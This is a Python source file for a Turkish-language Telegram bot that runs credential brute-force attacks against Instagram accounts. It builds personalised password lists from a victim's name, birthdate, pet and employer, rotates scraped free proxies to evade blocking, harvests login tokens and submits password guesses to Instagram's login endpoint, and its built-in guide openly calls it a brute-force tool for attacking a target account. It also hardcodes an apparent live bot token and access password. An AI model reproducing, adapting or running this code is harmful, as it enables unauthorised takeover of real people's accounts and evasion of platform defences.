#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import random
import time
import json
import re
import requests
import itertools
import os
from typing import List, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TelegramError

# Log ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Telegram bot token
TOKEN = os.getenv("BOT_TOKEN", "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU")

# Güvenlik şifresi
BOT_PASSWORD = os.getenv("BOT_PASSWORD", "vio1911")

# Ücretsiz proxy API'leri (birden fazla kaynak)
PROXY_APIS = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",  # ProxyScrape
    "https://gimmeproxy.com/api/getProxy?protocol=http",  # GimmeProxy
    "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",  # PubProxy
    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=600"  # GetProxyList
]

# CUPP tarzı şifre oluşturucu için yapılandırma
class PasswordGenerator:
    def __init__(self):
        self.config = {
            "chars": ['!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '+', '=', '?'],
            "years": [str(year) for year in range(1980, 2026)],
            "numfrom": 0,
            "numto": 100
        }
        self.leet_rules = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
        }
        self.max_password_length = 512
        self.max_passwords = 100000

    def generate_wordlist(self, profile: dict) -> List[str]:
        wordlist = []
        firstname = profile.get("firstname", "").lower()[:20]
        lastname = profile.get("lastname", "").lower()[:20]
        birthdate = profile.get("birthdate", "").replace("/", "")[:8]
        pet = profile.get("pet", "").lower()[:20]
        company = profile.get("company", "").lower()[:20]
        keywords = [k[:20] for k in profile.get("keywords", [])]

        base_words = [word for word in [firstname, lastname, pet, company] if word]
        base_words.extend(keywords)

        birthdate_formats = []
        if birthdate and len(birthdate) == 8:
            dd, mm, yyyy = birthdate[:2], birthdate[2:4], birthdate[4:]
            birthdate_formats.extend([dd, mm, yyyy, yyyy[-2:], yyyy[-3:], f"{dd}{mm}", f"{mm}{dd}", f"{dd}{yyyy}", f"{mm}{yyyy}"])

        for word in base_words:
            if len(word) <= self.max_password_length:
                wordlist.append(word)
                wordlist.append(word.capitalize())
            for year in birthdate_formats + self.config["years"]:
                if len(f"{word}{year}") <= self.max_password_length:
                    wordlist.append(f"{word}{year}")
                    wordlist.append(f"{year}{word}")
            for num in range(self.config["numfrom"], self.config["numto"] + 1):
                if len(f"{word}{num:02d}") <= self.max_password_length:
                    wordlist.append(f"{word}{num:02d}")
                    wordlist.append(f"{num:02d}{word}")

        for w1, w2 in itertools.combinations(base_words, 2):
            if len(wordlist) >= self.max_passwords:
                break
            if len(f"{w1}{w2}") <= self.max_password_length:
                wordlist.append(f"{w1}{w2}")
                wordlist.append(f"{w2}{w1}")
                wordlist.append(f"{w1.capitalize()}{w2.capitalize()}")
            for year in birthdate_formats + self.config["years"]:
                if len(f"{w1}{w2}{year}") <= self.max_password_length:
                    wordlist.append(f"{w1}{w2}{year}")
                    wordlist.append(f"{w2}{w1}{year}")

        if profile.get("leetmode", False):
            leet_words = []
            for word in wordlist[:]:
                leet_variations = [word]
                for char, replacements in self.leet_rules.items():
                    new_variations = []
                    for var in leet_variations:
                        if char in var.lower():
                            for repl in replacements:
                                new_var = var.replace(char, repl).replace(char.upper(), repl)
                                if len(new_var) <= self.max_password_length:
                                    new_variations.append(new_var)
                    leet_variations.extend(new_variations)
                leet_words.extend(leet_variations)
                if len(wordlist) + len(leet_words) >= self.max_passwords:
                    break
            wordlist.extend(leet_words)

        if profile.get("spechars", False):
            special_words = []
            for word in wordlist[:]:
                for char in self.config["chars"]:
                    if len(f"{word}{char}") <= self.max_password_length:
                        special_words.append(f"{word}{char}")
                    for char2 in self.config["chars"]:
                        if len(f"{word}{char}{char2}") <= self.max_password_length:
                            special_words.append(f"{word}{char}{char2}")
                if len(wordlist) + len(special_words) >= self.max_passwords:
                    break
            wordlist.extend(special_words)

        if profile.get("randnum", False):
            numbered_words = []
            for word in wordlist[:]:
                for num in range(self.config["numfrom"], self.config["numto"] + 1):
                    if len(f"{word}{num:02d}") <= self.max_password_length:
                        numbered_words.append(f"{word}{num:02d}")
                    if len(wordlist) + len(numbered_words) >= self.max_passwords:
                        break
                if len(wordlist) + len(numbered_words) >= self.max_passwords:
                    break
            wordlist.extend(numbered_words)

        return list(set(wordlist))[:self.max_passwords]

class InstagramBruteForce:
    def __init__(self):
        self.user_agent = self._get_realistic_user_agent()
        self.proxy_list = self._fetch_proxy_list()
        self.proxy_cache = {}
        self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
        self.current_proxy = None
        self.login_url = 'https://www.instagram.com/accounts/login/'
        self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        self.session = None
        self.csrf_token = None
        self.mid_cookie = None
        self.ig_did = None
        self.rollout_hash = None
        self._initialize()

    def _get_realistic_user_agent(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
        ]
        return random.choice(agents)

    def _fetch_proxy_list(self):
        proxies = set()
        for api_url in PROXY_APIS:
            try:
                response = requests.get(api_url, timeout=10)
                if response.status_code == 200:
                    proxy_lines = response.text.splitlines()
                    for line in proxy_lines:
                        if ':' in line:  # IP:PORT formatı
                            proxies.add(line.strip())
                logger.info(f"{api_url} 'den {len(proxy_lines)} proxy alındı.")
            except Exception as e:
                logger.error(f"{api_url} hatası: {e}")
        return list(proxies)

    def _get_working_proxy(self, progress_callback: Optional[callable] = None):
        if not self.proxy_list or not self.proxy_cycle:
            if progress_callback:
                progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
            return None
        
        for _ in range(len(self.proxy_list)):
            proxy = next(self.proxy_cycle)
            if proxy in self.proxy_cache and self.proxy_cache[proxy]['status'] == 'banned':
                continue
            try:
                test_session = requests.Session()
                test_session.proxies = {'http': proxy, 'https': proxy}
                response = test_session.get('https://www.google.com', timeout=5)
                if response.status_code == 200:
                    test_session.close()
                    self.proxy_cache[proxy] = {'status': 'working', 'last_used': time.time()}
                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
                    if progress_callback:
                        progress_callback(f"✅ Çalışan proxy bulundu: {proxy}")
                    return proxy
                else:
                    self.proxy_cache[proxy] = {'status': 'banned', 'last_used': time.time()}
                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {response.status_code}")
            except Exception as e:
                self.proxy_cache[proxy] = {'status': 'banned', 'last_used': time.time()}
                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
            time.sleep(1)
        
        # Yeniden fetch et
        self.proxy_list = self._fetch_proxy_list()
        self.proxy_cycle = itertools.cycle(self.proxy_list)
        return self._get_working_proxy(progress_callback)

    def _initialize(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.current_proxy = self._get_working_proxy()
        if self.current_proxy:
            self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}

    async def _get_initial_cookies_and_tokens(self, progress_callback: Optional[callable] = None):
        max_attempts = 10  # Daha fazla retry
        for attempt in range(1, max_attempts + 1):
            self.current_proxy = self._get_working_proxy(progress_callback)
            if self.current_proxy:
                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
            else:
                self.session.proxies = {}
            
            try:
                response = self.session.get('https://www.instagram.com/', timeout=15)
                if response.status_code != 200:
                    raise Exception(f"Instagram'a erişilemiyor: {response.status_code}")
                
                self.mid_cookie = self.session.cookies.get('mid')
                self.ig_did = self.session.cookies.get('ig_did')
                response = self.session.get(self.login_url, timeout=15)
                self.csrf_token = self.session.cookies.get('csrftoken')
                
                if not self.csrf_token:
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                    if csrf_match:
                        self.csrf_token = csrf_match.group(1)
                
                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', response.text)
                if rollout_match:
                    self.rollout_hash = rollout_match.group(1)
                else:
                    self.rollout_hash = str(int(time.time()))
                
                logger.debug(f"Token'lar alındı: CSRF={self.csrf_token}")
                if progress_callback:
                    await progress_callback(f"✅ Token'lar alındı!")
                return self.csrf_token is not None
            except Exception as e:
                logger.error(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
                if progress_callback:
                    await progress_callback(f"🔍 Token bulmaya çalışıyorum ({attempt}/{max_attempts})")
                if attempt < max_attempts:
                    await asyncio.sleep(5)
                continue
        
        if progress_callback:
            await progress_callback("❌ Token'lar alınamadı! Proxy değiştirerek tekrar deneyin.")
        return False

    def _make_login_request(self, username: str, password: str):
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': self.login_url,
            'X-CSRFToken': self.csrf_token,
            'X-Instagram-AJAX': self.rollout_hash,
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        timestamp = int(time.time())
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
        
        data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}'
        }
        
        try:
            response = self.session.post(self.api_url, headers=headers, data=data, timeout=15)
            logger.debug(f"API Yanıtı: {response.text}")
            return response
        except Exception as e:
            logger.error(f"Login request hatası: {e}")
            return None

    async def brute_force(self, username: str, password_list: List[str], 
                         progress_callback: Optional[callable] = None):
        start_time = time.time()
        total_passwords = len(password_list)
        potential_passwords = set()
        tried_passwords = 0
        
        try:
            await progress_callback(f"🚀 Instagram Brute Force Başlatılıyor\nHedef: {username}\nŞifre sayısı: {total_passwords}")
            
            success = await self._get_initial_cookies_and_tokens(progress_callback)
            if not success:
                await progress_callback("❌ Token'lar alınamadı!")
                return None
            
            await progress_callback(f"✅ Token'lar alındı! Şifreler deneniyor...")
            
            for i, password in enumerate(password_list):
                if self.proxy_list and i % 10 == 0:
                    self.current_proxy = self._get_working_proxy(progress_callback)
                    if self.current_proxy:
                        self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                
                response = self._make_login_request(username, password)
                result = "ERROR"
                
                if response and response.status_code == 200:
                    try:
                        json_data = response.json()
                        if json_data.get('authenticated'):
                            result = "SUCCESS"
                            await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                            await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
                            return password
                        elif json_data.get('authenticated') == False:
                            result = "WRONG"
                        elif json_data.get('two_factor_required'):
                            result = "2FA"
                            await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                            await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
                            return password
                        elif json_data.get('checkpoint_url'):
                            result = "CHECKPOINT"
                            await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                            await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
                            return password
                        else:
                            result = "UNKNOWN"
                    except json.JSONDecodeError:
                        result = "ERROR"
                
                await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                
                tried_passwords += 1
                
                if (i + 1) % 5 == 0:
                    await self._get_initial_cookies_and_tokens(progress_callback)
                
                delay = random.uniform(5, 15)
                await asyncio.sleep(delay)
            
            report = f"📊 Rapor:\nDenenen şifre: {tried_passwords}/{total_passwords}"
            if potential_passwords:
                report += f"\n⚠️ Hata alınan şifreler (doğru olabilir): {', '.join(list(potential_passwords)[:5])}"
            
            await progress_callback(report)
            return None
            
        except Exception as e:
            logger.error(f"Brute force hatası: {e}")
            await progress_callback(f"❌ Beklenmeyen hata: {str(e)}")
            return None

class TelegramBot:
    def __init__(self):
        self.user_data = {}
        self.brute_force_tasks = {}
        self.password_generator = PasswordGenerator()

    def _initialize_user_data(self, user_id: int):
        if user_id not in self.user_data:
            self.user_data[user_id] = {
                'username': None,
                'password_file': None,
                'password_profile': {
                    'firstname': '', 'lastname': '', 'birthdate': '',
                    'pet': '', 'company': '', 'keywords': [],
                    'leetmode': False, 'spechars': False, 'randnum': False
                }
            }

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)
        
        banner = """
  _              _            _____                                  
 (_) _ __   ___ | |_   __ _   \_   \ _ __   ___   __ _  _ __    ___ 
 | || '_ \ / __|| __| / _` |   / /\/| '_ \ / __| / _` || '_ \  / _ \
 | || | | |\__ \| |_ | (_| |/\/ /_  | | | |\__ \| (_| || | | ||  __/
 |_||_| |_||___/ \__| \__,_|\____/  |_| |_||___/ \__,_||_| |_| \___|
        """
        
        try:
            await update.message.reply_text(f"```{banner}```", parse_mode='Markdown')
            await update.message.reply_text("🔒 Lütfen bot şifresini girin:")
            context.user_data['awaiting'] = 'password'
        except Exception as e:
            logger.error(f"Start hatası: {e}")
            await update.message.reply_text("❌ Mesaj gönderilirken hata oluştu!")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)

        awaiting = context.user_data.get('awaiting')
        
        if not awaiting:
            await update.message.reply_text("❌ Önce /start komutunu kullan!")
            return

        if awaiting == 'password':
            entered_password = update.message.text.strip()
            if not entered_password:
                await update.message.reply_text("❌ Boş şifre girilemez!")
                return
            
            if entered_password == BOT_PASSWORD:
                context.user_data['awaiting'] = None
                welcome_message = "👾 HACKER V3.0 AKTİF! 👾\n🔥 Hoş geldin V.VV SUNAR KEYFİNE BAK 🔥"
                
                keyboard = [
                    [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
                    [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
                    [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                    [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
                    [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
                ]
                
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(welcome_message, reply_markup=reply_markup)
            else:
                await update.message.reply_text("❌ Yanlış şifre! Tekrar dene.")
            return

        elif awaiting == 'username':
            username = update.message.text.strip()
            if not username:
                await update.message.reply_text("❌ Boş kullanıcı adı girilemez!")
                return
            
            if len(username) > 30:
                await update.message.reply_text("❌ Kullanıcı adı 30 karakterden uzun olamaz!")
                return
            
            self.user_data[user_id]['username'] = username
            await update.message.reply_text(f"✅ Kullanıcı adı ayarlandı: {username}")
            context.user_data['awaiting'] = None

        elif awaiting == 'password_file':
            if update.message.document:
                try:
                    file = await update.message.document.get_file()
                    file_path = f"passwords_{user_id}.txt"
                    await file.download_to_drive(custom_path=file_path)
                    
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip()]
                    
                    if not passwords:
                        await update.message.reply_text("❌ Şifre listesi boş!")
                        os.remove(file_path)
                        return
                    
                    self.user_data[user_id]['password_file'] = file_path
                    await update.message.reply_text(f"✅ Şifre listesi yüklendi! ({len(passwords)} şifre)")
                    context.user_data['awaiting'] = None
                    
                except Exception as e:
                    await update.message.reply_text(f"❌ Dosya işlenirken hata: {str(e)}")
            else:
                await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")

        elif awaiting == 'password_profile':
            try:
                profile_input = update.message.text.strip().split(',')
                if len(profile_input) < 1:
                    await update.message.reply_text("❌ Lütfen geçerli bir formatta bilgi gir!")
                    return
                
                profile = {
                    'firstname': profile_input[0].strip() if len(profile_input) > 0 else '',
                    'lastname': profile_input[1].strip() if len(profile_input) > 1 else '',
                    'birthdate': profile_input[2].strip() if len(profile_input) > 2 else '',
                    'pet': profile_input[3].strip() if len(profile_input) > 3 else '',
                    'company': profile_input[4].strip() if len(profile_input) > 4 else '',
                    'keywords': profile_input[5].split() if len(profile_input) > 5 else [],
                    'leetmode': '-leet' in profile_input,
                    'spechars': '-spec' in profile_input,
                    'randnum': '-rand' in profile_input
                }
                
                # Şifre listesini oluştur
                wordlist = self.password_generator.generate_wordlist(profile)
                if not wordlist:
                    await update.message.reply_text("❌ Şifre listesi oluşturulamadı! Lütfen bilgileri kontrol et.")
                    return
                
                # Şifreleri dosyaya kaydet
                file_path = f"generated_passwords_{user_id}.txt"
                with open(file_path, 'w', encoding='utf-8') as f:
                    for password in wordlist:
                        f.write(password + '\n')
                
                # Kullanıcıya dosyayı gönder
                with open(file_path, 'rb') as f:
                    await update.message.reply_document(document=InputFile(f, filename=f"passwords_{user_id}.txt"),
                                                    caption=f"✅ {len(wordlist)} şifre oluşturuldu!")
                
                # Oluşturulan dosyayı user_data'ya kaydet
                self.user_data[user_id]['password_file'] = file_path
                context.user_data['awaiting'] = None
            except Exception as e:
                await update.message.reply_text(f"❌ Hata oluştu: {str(e)}")

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        self._initialize_user_data(user_id)

        if query.data == 'set_username':
            await query.message.reply_text("🎯 Lütfen Instagram kullanıcı adını gir:")
            context.user_data['awaiting'] = 'username'

        elif query.data == 'set_password_file':
            await query.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
            context.user_data['awaiting'] = 'password_file'

        elif query.data == 'generate_password_list':
            await query.message.reply_text(
                "🔑 Şifre listesi oluşturmak için bilgileri gir:\n"
                "Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler\n"
                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2\n"
                "Not: Doğum tarihi DDMMYYYY formatında olmalı. Anahtar kelimeler boşlukla ayrılmalı.\n"
                "Seçenekler: -leet (leet mode), -spec (özel karakterler), -rand (rastgele sayılar)\n"
                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -spec"
            )
            context.user_data['awaiting'] = 'password_profile'

        elif query.data == 'how_to_use':
            how_to_message = """
            📖 **Bot Kullanım Kılavuzu** 📖
            
            Bu bot, Instagram hesaplarına yönelik bir brute force aracıdır. Aşağıdaki adımları takip ederek kullanabilirsiniz:
            
            1. **Şifre Girişi**: Botu başlatmak için /start komutunu kullanın ve bot şifresini girin (varsayılan: vio1911).
            
            2. **Kullanıcı Adı Ayarla**: "🎯 Kullanıcı Adı Gir" butonuna tıklayın ve hedef Instagram kullanıcı adını girin.
            
            3. **Şifre Listesi Yükle veya Oluştur**:
               - **Yükle**: "📜 Şifre Listesi Yükle" butonuna tıklayın ve bir .txt dosyası yükleyin (her satırda bir şifre).
               - **Oluştur**: "🔑 Şifre Listesi Oluştur" butonuna tıklayın ve profil bilgilerini girin (ad, soyad, doğum tarihi vb.).
                 Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler,-leet -spec -rand
                 Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -spec
            
            4. **Saldırıyı Başlat**: "🚀 Saldırıyı Başlat" butonuna tıklayın. Bot, yüklediğiniz şifre listesini kullanarak hedef hesaba deneme yapacaktır.
            
            5. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
            
            ⚠️ **Notlar**:
            - Bot, Instagram'ın güvenlik mekanizmalarına (CAPTCHA, 2FA, checkpoint) karşı hassastır.
            - Proxy'ler otomatik olarak birden fazla ücretsiz kaynaktan çekilir.
            - Oluşturulan şifre listesi otomatik olarak kaydedilir ve saldırı için kullanılabilir.
            - Botun kullanımı tamamen kullanıcının sorumluluğundadır.
            
            Sorularınız için tekrar bu menüye dönebilirsiniz!
            """
            await query.message.reply_text(how_to_message, parse_mode='Markdown')

        elif query.data == 'start_attack':
            await self.start_attack(update, context)

        elif query.data == 'cancel':
            context.user_data['awaiting'] = None
            await query.message.reply_text("❌ İşlem iptal edildi.")

    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if not self.user_data[user_id]['username']:
            await query.message.reply_text("❌ Önce bir kullanıcı adı ayarla!")
            return
        
        if not self.user_data[user_id]['password_file']:
            await query.message.reply_text("❌ Önce bir şifre listesi yükle veya oluştur!")
            return
        
        try:
            with open(self.user_data[user_id]['password_file'], 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            await query.message.reply_text(f"❌ Şifre listesi okunamadı: {str(e)}")
            return
        
        await query.message.reply_text(f"🚀 Saldırı başlatılıyor...\nHedef: {self.user_data[user_id]['username']}\nŞifre sayısı: {len(passwords)}")
        
        instagram_brute = InstagramBruteForce()
        
        async def progress_callback(message):
            try:
                await query.message.reply_text(message)
            except Exception as e:
                logger.error(f"Progress callback error: {e}")
        
        result = await instagram_brute.brute_force(
            self.user_data[user_id]['username'],
            passwords,
            progress_callback
        )
        
        if result:
            await query.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {result}")
        else:
            await query.message.reply_text("❌ Şifre bulunamadı!")

def main():
    application = Application.builder().token(TOKEN).build()
    bot = TelegramBot()
    
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CallbackQueryHandler(bot.button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_message))
    
    logger.info("Bot başlatılıyor...")
    application.run_polling()

if __name__ == '__main__':
    main()
